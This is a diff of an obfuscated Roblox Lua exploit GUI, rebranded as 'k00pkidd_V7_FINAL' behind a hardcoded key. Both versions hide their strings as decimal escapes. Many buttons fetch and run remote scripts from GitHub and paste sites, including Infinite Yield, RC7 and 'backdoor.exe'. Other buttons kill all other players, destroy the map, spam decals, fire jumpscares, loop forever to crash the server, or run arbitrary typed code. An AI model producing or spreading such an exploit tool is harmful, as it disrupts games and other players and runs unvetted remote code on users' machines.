@@ -1,149 +1,138 @@
-local l1ll1l1I1 = game:GetService("\67\111\114\101\71\117\105")
-local I1l1IIl1I = game:GetService("\80\108\97\121\101\114\115")
-local lI1llI1lI = I1l1IIl1I.LocalPlayer
-local I1I1I1I1I = Instance.new("\83\99\114\101\101\110\71\117\105")
-I1I1I1I1I.Parent = l1ll1l1I1
-I1I1I1I1I.Name = "\73\110\116\101\114\110\97\108\77\111\100\117\108\101"
-I1I1I1I1I.ResetOnSpawn = false
-local ll11lII1l = Instance.new("\84\101\120\116\66\117\116\116\111\110")
-ll11lII1l.Parent = I1I1I1I1I
-ll11lII1l.Name = "\84\111\103\103\108\101"
-ll11lII1l.Text = "\47"
-ll11lII1l.Size = UDim2.new(0, 67, 0, 67)
-ll11lII1l.Position = UDim2.new(0, 10, 0.1, -45)
-ll11lII1l.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-ll11lII1l.TextColor3 = Color3.fromRGB(255, 255, 255)
-ll11lII1l.Font = Enum.Font.SourceSansBold
-ll11lII1l.BorderSizePixel = 0
-local l1lI1lI1l = Instance.new("\83\99\114\111\108\108\105\110\103\70\114\97\109\101")
-l1lI1lI1l.Parent = I1I1I1I1I
-l1lI1lI1l.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-l1lI1lI1l.BorderSizePixel = 0
-l1lI1lI1l.Position = UDim2.new(0, 5, 0.1, 0)
-l1lI1lI1l.Size = UDim2.new(0, 350, 0, 400)
-l1lI1lI1l.CanvasSize = UDim2.new(0, 0, 5, 0)
-l1lI1lI1l.ScrollBarThickness = 3
-l1lI1lI1l.Active = true
-l1lI1lI1l.Selectable = true
-l1lI1lI1l.Visible = true
-local lI1lI1lI1 = Instance.new("\85\73\76\105\115\116\76\97\121\111\117\116")
-lI1lI1lI1.Parent = l1lI1lI1l
-lI1lI1lI1.Padding = UDim.new(0, 2)
-lI1lI1lI1.HorizontalAlignment = Enum.HorizontalAlignment.Center
-lI1lI1lI1.SortOrder = Enum.SortOrder.LayoutOrder
-ll11lII1l.MouseButton1Click:Connect(function() l1lI1lI1l.Visible = not l1lI1lI1l.Visible end)
-local function lIlIlIlIl(l1I1I1I1I, lIIlIIlII)
-local l1l1l1l1l = Instance.new("\84\101\120\116\66\117\116\116\111\110")
-l1l1l1l1l.Parent = l1lI1lI1l
-l1l1l1l1l.Size = UDim2.new(1.7, 0, 0, 35)
-l1l1l1l1l.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-l1l1l1l1l.TextColor3 = Color3.fromRGB(255, 255, 255)
-l1l1l1l1l.Text = l1I1I1I1I
-l1l1l1l1l.Font = Enum.Font.SourceSansBold
-l1l1l1l1l.TextSize = 20
-l1l1l1l1l.BorderSizePixel = 0
-l1l1l1l1l.MouseButton1Click:Connect(function() pcall(lIIlIIlII) end)
+local l1 = game:GetService("\67\111\114\101\71\117\105")
+local l2 = game:GetService("\84\119\101\101\110\83\101\114\118\105\99\101")
+local l3 = game:GetService("\80\108\97\121\101\114\115").LocalPlayer
+local sg = Instance.new("\83\99\114\101\101\110\71\117\105", l1)
+sg.Name = "\107\48\48\112\107\105\100\100\95\86\55\95\70\73\78\65\76"
+
+local function k_sys()
+    local f = Instance.new("\70\114\97\109\101", sg)
+    f.Size = UDim2.new(0, 320, 0, 180)
+    f.Position = UDim2.new(0.5, -160, 0.5, -90)
+    f.BackgroundColor3 = Color3.fromRGB(15, 0, 0)
+    f.BorderSizePixel = 2
+    f.BorderColor3 = Color3.fromRGB(255, 0, 0)
+    Instance.new("\85\73\67\111\114\110\101\114", f)
+    
+    local i = Instance.new("\84\101\120\116\66\111\120", f)
+    i.Size = UDim2.new(0, 240, 0, 35)
+    i.Position = UDim2.new(0.5, -120, 0.45, 0)
+    i.PlaceholderText = "\107\48\48\112\107\105\100\100\32\75\69\89"
+    i.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
+    i.TextColor3 = Color3.fromRGB(255, 255, 255)
+    
+    local b = Instance.new("\84\101\120\116\66\117\116\116\111\110", f)
+    b.Size = UDim2.new(0, 120, 0, 35)
+    b.Position = UDim2.new(0.5, -60, 0.68, 0)
+    b.Text = "\76\79\71\73\78"
+    b.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    b.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+    b.MouseButton1Click:Connect(function()
+        if i.Text == "\107\48\48\112\107\105\100\100" then f:Destroy() m_ui() end
+    end)
 end
-lIlIlIlIl("\83\107\121\98\111\120", function()
-local s = Instance.new("\83\107\121", game.Lighting)
-local id = "\114\98\120\97\115\115\101\116\105\100\58\47\47\57\52\50\50\56\54\54\50\52\56"
-s.SkyboxBk = id s.SkyboxDn = id s.SkyboxFt = id s.SkyboxLf = id s.SkyboxRt = id s.SkyboxUp = id
-game.Lighting.TimeOfDay = 12
-end)
-lIlIlIlIl("\68\101\99\97\108", function()
-for _, v in pairs(game.Workspace:GetDescendants()) do
-if v:IsA("\66\97\115\101\80\97\114\116") then
-local f = {"\70\114\111\110\116","\66\97\99\107","\76\101\102\116","\82\105\103\104\116","\84\111\112","\66\111\116\116\111\109"}
-for _, face in pairs(f) do
-local d = Instance.new("\68\101\99\97\108", v)
-d.Texture = "\114\98\120\97\115\115\101\116\105\100\58\47\47\57\52\50\50\56\54\54\50\52\56"
-d.Face = Enum.NormalId[face]
+
+function m_ui()
+    local m = Instance.new("\70\114\97\109\101", sg)
+    m.Size = UDim2.new(0, 550, 0, 350)
+    m.Position = UDim2.new(0.5, -275, 0.5, -175)
+    m.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
+    m.Active = true m.Draggable = true
+    Instance.new("\85\73\67\111\114\110\101\114", m)
+
+    local s = Instance.new("\83\99\114\101\108\108\105\110\103\70\114\97\109\101", m)
+    s.Size = UDim2.new(0, 130, 1, -10)
+    s.Position = UDim2.new(0, 5, 0, 5)
+    s.BackgroundTransparency = 1
+    s.CanvasSize = UDim2.new(0, 0, 2, 0)
+    s.ScrollBarThickness = 0
+    Instance.new("\85\73\76\105\115\116\76\97\121\111\117\116", s).Padding = UDim.new(0, 5)
+
+    local function t(n)
+        local b = Instance.new("\84\101\120\116\66\117\116\116\111\110", s)
+        b.Size = UDim2.new(1, -10, 0, 30)
+        b.Text = n
+        b.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        b.TextColor3 = Color3.fromRGB(255, 0, 0)
+        b.Font = Enum.Font.Code
+        local c = Instance.new("\83\99\114\111\108\108\105\110\103\70\114\97\109\101", m)
+        c.Size = UDim2.new(0, 400, 0, 330)
+        c.Position = UDim2.new(0, 140, 0, 10)
+        c.Visible = false c.BackgroundTransparency = 1
+        c.CanvasSize = UDim2.new(0, 0, 10, 0)
+        c.ScrollBarThickness = 2
+        Instance.new("\85\73\76\105\115\116\76\97\121\111\117\116", c).Padding = UDim.new(0, 5)
+        b.MouseButton1Click:Connect(function()
+            for _, v in pairs(m:GetChildren()) do if v:IsA("\83\99\114\111\108\108\105\110\103\70\114\97\109\101") and v ~= s then v.Visible = false end end
+            c.Visible = true
+        end)
+        return c
+    end
+
+    local h = t("\72\79\77\69")
+    local ma = t("\77\65\73\78")
+    local tr = t("\84\82\79\76\76")
+    local vi = t("\86\73\83\85\65\76")
+    local pl = t("\80\76\65\89\69\82")
+    local se = t("\83\69\82\86\69\82")
+    local ex = t("\69\88\69\67\85\84\79\82")
+
+    local function ab(p, n, c)
+        local b = Instance.new("\84\101\120\116\66\117\116\116\111\110", p)
+        b.Size = UDim2.new(1, -10, 0, 35)
+        b.Text = "  > " .. n
+        b.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        b.TextColor3 = Color3.fromRGB(255, 255, 255)
+        b.TextXAlignment = Enum.TextXAlignment.Left
+        b.Font = Enum.Font.Code
+        b.MouseButton1Click:Connect(c)
+    end
+
+    ab(tr, "\74\117\109\112\115\99\97\114\101\32\71\85\73", function()
+        local jf = Instance.new("\73\109\97\103\101\76\97\98\101\108", sg)
+        jf.Size = UDim2.new(1, 0, 1, 0)
+        jf.Image = "rbxassetid://9422866248"
+        jf.ZIndex = 999
+        local js = Instance.new("\83\111\117\110\100", workspace)
+        js.SoundId = "rbxassetid://556752357"
+        js.Volume = 10 js:Play()
+        task.wait(2.5) jf:Destroy()
+    end)
+
+    ab(h, "\73\110\102\105\110\105\116\121\32\89\105\101\108\100", function() loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\69\100\103\101\73\89\47\105\110\102\105\110\105\116\101\121\105\101\108\100\47\109\97\115\116\101\114\47\115\111\114\99\101"))() end)
+    ab(vi, "\82\101\97\108\32\72\105\110\116", function() local hi=Instance.new("\72\105\110\116",workspace) hi.Text="\107\48\48\112\107\105\100\100\32\104\97\99\107\101\100\32\116\104\101\32\103\97\109\101\33\33" end)
+    ab(vi, "\82\101\97\108\32\83\107\121\98\111\120", function() local s=Instance.new("\83\107\121",game.Lighting) local id="rbxassetid://9422866248" s.SkyboxBk=id s.SkyboxDn=id s.SkyboxFt=id s.SkyboxLf=id s.SkyboxRt=id s.SkyboxUp=id end)
+    ab(vi, "\82\101\97\108\32\68\101\99\97\108\32\83\112\97\109", function() for _,v in pairs(workspace:GetDescendants()) do if v:IsA("\66\97\115\101\80\97\114\116") then for i=0,5 do local d=Instance.new("\68\101\99\97\108",v) d.Face=i d.Texture="rbxassetid://9422866248" end end end end)
+    ab(pl, "\83\112\101\101\100\32\49\48\48", function() l3.Character.Humanoid.WalkSpeed = 100 end)
+    ab(se, "\67\114\97\115\104\32\83\101\114\118\101\114", function() while true do print("\107\48\48\112\107\105\100\100") end end)
+
+    local eb = Instance.new("\84\101\120\116\66\111\120", ex)
+    eb.Size = UDim2.new(1, -10, 0, 180)
+    eb.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+    eb.TextColor3 = Color3.fromRGB(0, 255, 0)
+    eb.MultiLine = true eb.TextWrapped = true
+    ab(ex, "\69\88\69\67\85\84\69", function() loadstring(eb.Text)() end)
+
+    local tg = Instance.new("\84\101\120\116\66\117\116\116\111\110", m)
+    tg.Size = UDim2.new(0, 30, 0, 30)
+    tg.Position = UDim2.new(1, -35, 0, 5)
+    tg.Text = "\45"
+    tg.TextColor3 = Color3.fromRGB(255, 0, 0)
+    local min = false
+    tg.MouseButton1Click:Connect(function()
+        min = not min
+        if min then
+            tg.Text = "\43"
+            l2:Create(m, TweenInfo.new(0.3), {Size = UDim2.new(0, 40, 0, 40)}):Play()
+            s.Visible = false
+            for _, v in pairs(m:GetChildren()) do if v:IsA("\83\99\114\111\108\108\105\110\103\70\114\97\109\101") then v.Visible = false end end
+        else
+            tg.Text = "\45"
+            l2:Create(m, TweenInfo.new(0.3), {Size = UDim2.new(0, 550, 0, 350)}):Play()
+            task.wait(0.3) s.Visible = true h.Visible = true
+        end
+    end)
+    h.Visible = true
 end
-end
-end
-end)
-lIlIlIlIl("\72\105\110\116", function()
-local h = Instance.new("\72\105\110\116", game.Workspace)
-h.Text = "\75\48\48\80\75\73\68\68\32\72\65\83\32\74\79\73\78\69\68\32\84\72\69\32\83\69\82\86\69\82\33"
-end)
-lIlIlIlIl("\82\54", function()
-lI1llI1lI.CharacterAppearanceId = 1
-if lI1llI1lI.Character then lI1llI1lI.Character:BreakJoints() end
-end)
-lIlIlIlIl("\73\110\102\105\110\105\116\121\32\89\105\101\108\100", function()
-loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\69\100\103\101\73\89\47\105\110\102\105\110\105\116\101\121\105\101\108\100\47\109\97\115\116\101\114\47\115\111\117\114\99\101"))()
-end)
-lIlIlIlIl("\80\97\114\116\105\99\108\101", function()
-for _, v in pairs(I1l1IIl1I:GetPlayers()) do
-local r = v.Character and v.Character:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116")
-if r and not r:FindFirstChild("\75\48\48\112\107\105\100\100\65\117\114\97") then
-local p = Instance.new("\80\97\114\116\105\99\108\101\69\109\105\116\116\101\114", r)
-p.Name = "\75\48\48\112\107\105\100\100\65\117\114\97"
-p.Texture = "\114\98\120\97\115\115\101\116\105\100\58\47\47\57\52\50\50\56\54\54\50\52\56"
-p.Rate = 100 p.Lifetime = NumberRange.new(1, 2) p.Speed = NumberRange.new(5)
-p.Color = ColorSequence.new(Color3.fromRGB(0, 255, 0))
-end
-end
-end)
-lIlIlIlIl("\75\105\108\108\32\97\108\108", function()
-for _, v in pairs(I1l1IIl1I:GetPlayers()) do
-if v ~= lI1llI1lI and v.Character and v.Character:FindFirstChild("\72\117\109\97\110\111\105\100") then
-v.Character.Humanoid.Health = 0
-end
-end
-end)
-lIlIlIlIl("\105\32\108\111\118\101\32\121\111\117\32\115\111", function()
-local s = Instance.new("\83\111\117\110\100", game.Workspace)
-s.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\57\56\51\54\52\48\51\52\52\53\56\50\54\48"
-s.Volume = 10 s:Play()
-end)
-lIlIlIlIl("\99\48\48\108\99\108\97\110", function()
-loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\115\99\114\105\112\116\115\46\110\101\116\47\114\97\119\47\85\110\105\118\101\114\115\97\108\45\83\99\114\105\112\116\45\99\48\48\108\99\108\97\110\45\118\49\45\53\48\56\50\54"))()
-end)
-lIlIlIlIl("\82\67\55", function()
-loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\86\52\77\80\76\48\48\78\89\47\82\67\55\45\45\45\72\97\115\116\101\114\109\97\122\101\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\82\67\55"))()
-end)
-lIlIlIlIl("\73\110\99\111\109\117\32\71\85\73", function()
-loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\120\85\120\86\89\110\89\74\47\114\97\119"))()
-end)
-lIlIlIlIl("\74\117\109\112\115\99\97\114\101\32\71\85\73", function()
-loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\121\117\115\117\102\109\117\115\116\111\102\97\50\53\49\45\98\111\111\112\47\74\117\109\112\115\99\97\114\101\45\71\85\73\45\118\49\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\74\117\109\112\115\99\97\114\101\37\50\48\118\49"))()
-end)
-lIlIlIlIl("\54\54\54", function()
-game.Lighting.Ambient = Color3.new(1, 0, 0)
-game.Lighting.FogEnd = 50
-game.Lighting.FogColor = Color3.new(0, 0, 0)
-end)
-lIlIlIlIl("\75\82\78\76\32\69\120\101\99\117\116\111\114", function()
-loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\121\117\115\117\102\109\117\115\116\111\102\97\50\53\49\45\98\111\111\112\47\85\110\105\118\101\114\115\97\108\45\71\117\105\45\86\49\45\70\114\101\101\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\75\82\78\76\37\50\48\82\101\109\97\107\101"))()
-end)
-lIlIlIlIl("\66\97\99\107\100\111\111\114\46\101\120\101\32\118\56", function()
-loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\105\75\52\111\83\47\98\97\99\107\100\111\111\114\46\101\120\101\47\118\56\47\115\114\99\47\109\97\105\110\46\108\117\97"))()
-end)
-lIlIlIlIl("\65\114\99\101\117\115\32\88\32\78\101\111", function()
-loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\65\90\121\115\71\105\116\104\117\98\47\99\104\105\108\108\122\45\119\111\114\107\115\104\111\112\47\109\97\105\110\47\65\114\99\101\117\115\37\50\48\88\37\50\48\86\51"))()
-end)
-lIlIlIlIl("\82\111\45\88\112\108\111\105\116\101\114", function()
-loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\115\99\114\105\112\116\98\108\111\120\46\99\111\109\47\114\97\119\47\85\110\105\118\101\114\115\97\108\45\83\99\114\105\112\116\45\82\111\88\112\108\111\105\116\45\98\121\45\75\114\121\115\116\97\108\84\101\97\109\45\57\51\50\56"))()
-end)
-lIlIlIlIl("\76\97\108\111\108\32\72\117\98", function()
-loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\73\116\115\45\76\65\76\79\76\47\76\65\76\79\76\45\72\117\98\47\109\97\105\110\47\66\97\99\107\100\111\111\114\45\83\99\97\110\110\101\114\47\115\114\105\112\116"))()
-end)
-lIlIlIlIl("\65\110\116\105\32\76\101\97\118\101", function()
-game:GetService("\82\117\110\83\101\114\118\105\101\99\101").RenderStepped:Connect(function() while true do end end)
-end)
-lIlIlIlIl("\68\101\115\116\114\111\121\32\77\97\112", function()
-for _, v in pairs(game.Workspace:GetChildren()) do
-if v:IsA("\66\97\115\101\80\97\114\116") and not v:IsA("\84\101\114\114\97\105\110") then v:Destroy() end
-end
-end)
-lIlIlIlIl("\69\120\112\108\111\100\101", function()
-local r = lI1llI1lI.Character and lI1llI1lI.Character:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116")
-if r then Instance.new("\69\120\112\108\111\115\105\111\110", game.Workspace).Position = r.Position end
-end)
-lIlIlIlIl("\65\110\99\104\111\114", function()
-for _, v in pairs(game.Workspace:GetDescendants()) do if v:IsA("\66\97\115\101\80\97\114\116") then v.Anchored = true end end
-end)
-lIlIlIlIl("\85\110\65\110\99\104\111\114", function()
-for _, v in pairs(game.Workspace:GetDescendants()) do if v:IsA("\66\97\115\101\80\97\114\116") then v.Anchored = false end end
-end)
+
+k_sys()
